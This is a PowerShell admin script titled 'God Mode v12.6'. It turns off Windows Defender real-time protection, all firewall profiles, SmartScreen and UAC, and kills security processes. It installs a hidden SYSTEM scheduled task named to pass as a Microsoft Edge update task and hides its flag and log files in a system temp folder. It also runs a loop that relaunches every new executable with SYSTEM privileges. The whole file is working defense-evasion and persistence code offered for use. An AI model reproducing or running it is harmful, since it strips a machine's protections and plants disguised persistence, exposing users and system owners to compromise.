#Requires -RunAsAdministrator

<#
.SYNOPSIS
    God Mode v12.6 - Weaknesses Further Improved
#>

param(
    [switch]$ToggleOn,
    [switch]$ToggleOff,
    [switch]$Status,
    [switch]$Launch,
    [switch]$Verbose
)

$FlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
$LogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
$TaskPrefix = "MicrosoftEdgeUpdateTask_"

# Security Check
function Test-BuiltInAdmin {
    $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    return ($sid -like "*-500")
}

if (-not (Test-BuiltInAdmin) -and -not $Status) {
    Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use this tool.`n" -ForegroundColor Red
    exit 1
}

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "[$timestamp] [$Level] $Message" | Out-File $LogFile -Append -Encoding UTF8

    if ($Verbose -or $Level -in @("ERROR", "WARN")) {
        Write-Host "[$timestamp] [$Level] $Message"
    }
}

# Dangerous Mode
function Enable-DangerousMode {
    Write-Log "Enabling dangerous mode..." "WARN"
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Force

        Get-Process -Name MsMpEng, smartscreen, SecurityHealthService -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Log "Error enabling dangerous mode: $_" "ERROR"
    }
}

function Disable-DangerousMode {
    Write-Log "Disabling dangerous mode..." "WARN"
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $true -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 1 -Force
        Start-Service -Name WinDefend -ErrorAction SilentlyContinue
    } catch {
        Write-Log "Could not fully restore settings." "ERROR"
    }
}

# Stealth Task
function Register-StealthTask {
    $taskName = $TaskPrefix + (Get-Random -Minimum 10000 -Maximum 99999)
    Unregister-StealthTask

    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Launch"

    $trigger = New-ScheduledTaskTrigger -AtLogon
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
        -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
        -Principal $principal -Force | Out-Null
}

function Unregister-StealthTask {
    Get-ScheduledTask -TaskName "$TaskPrefix*" -ErrorAction SilentlyContinue |
        Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
}

# Improved Elevation with Stronger Duplicate Prevention
function Elevate-Process {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return }

    Write-Log "Elevating: $Path" "STEALTH"

    try {
        $action = New-ScheduledTaskAction -Execute $Path
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
            -LogonType ServiceAccount -RunLevel Highest
        $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)

        Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
        Start-ScheduledTask -TaskName $tempTask
        Start-Sleep -Milliseconds 400
        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false
    } catch {
        Write-Log "Failed to elevate: $Path" "ERROR"
    }
}

# Monitoring Loop with Improved Stability
function Start-Monitoring {
    if (-not (Test-Path $FlagFile)) {
        Write-Log "God Mode is not enabled." "ERROR"
        return
    }

    Write-Log "Monitoring started with auto-recovery." "INFO"

    $lastElevated = @{}   # Process path → last elevated time

    while ($true) {
        try {
            Start-Sleep -Seconds 2

            $newProcesses = Get-WmiObject Win32_Process | Where-Object {
                $_.CreationDate -and 
                ([datetime]::ParseExact($_.CreationDate.Substring(0,14), "yyyyMMddHHmmss", $null)) -gt (Get-Date).AddSeconds(-10)
            }

            foreach ($proc in $newProcesses) {
                if ($proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe") {
                    $path = $proc.ExecutablePath

                    # Stronger duplicate prevention (60-second cooldown)
                    if (-not $lastElevated.ContainsKey($path) -or 
                        $lastElevated[$path] -lt (Get-Date).AddSeconds(-60)) {

                        $lastElevated[$path] = Get-Date
                        Elevate-Process $path
                    }
                }
            }
        }
        catch {
            Write-Log "Monitoring error (recovering in 5s): $_" "ERROR"
            Start-Sleep -Seconds 5
        }
    }
}

# Toggle & Status
function Enable-GodMode {
    "1" | Out-File $FlagFile -Force
    Register-StealthTask
    Enable-DangerousMode
    Write-Log "God Mode ENABLED" "WARN"
}

function Disable-GodMode {
    Remove-Item $FlagFile -Force -ErrorAction SilentlyContinue
    Unregister-StealthTask
    Disable-DangerousMode
    Write-Log "God Mode DISABLED" "WARN"
}

function Show-Status {
    if (Test-Path $FlagFile) {
        Write-Host "God Mode: ACTIVE (Dangerous + Stealth)" -ForegroundColor Red
    } else {
        Write-Host "God Mode: INACTIVE" -ForegroundColor Green
    }
}

# Menu
function Show-Menu {
    Clear-Host
    Write-Host "=== GOD MODE v12.6 ===" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "1. Enable God Mode"
    Write-Host "2. Disable God Mode"
    Write-Host "3. Check Status"
    Write-Host "4. Start Monitoring"
    Write-Host "5. Exit"
    Write-Host ""

    $choice = Read-Host "Select option (1-5)"

    switch ($choice) {
        "1" { Enable-GodMode; Write-Host "God Mode enabled." -ForegroundColor Green; Start-Sleep -Seconds 2; Show-Menu }
        "2" { Disable-GodMode; Write-Host "God Mode disabled." -ForegroundColor Yellow; Start-Sleep -Seconds 2; Show-Menu }
        "3" { Show-Status; Start-Sleep -Seconds 2; Show-Menu }
        "4" { Start-Monitoring }
        "5" { exit }
        default { Write-Host "Invalid option." -ForegroundColor Red; Start-Sleep -Seconds 1; Show-Menu }
    }
}

# Main
if ($ToggleOn)  { Enable-GodMode; exit }
if ($ToggleOff) { Disable-GodMode; exit }
if ($Status)    { Show-Status; exit }
if ($Launch)    { Start-Monitoring; exit }

Show-Menu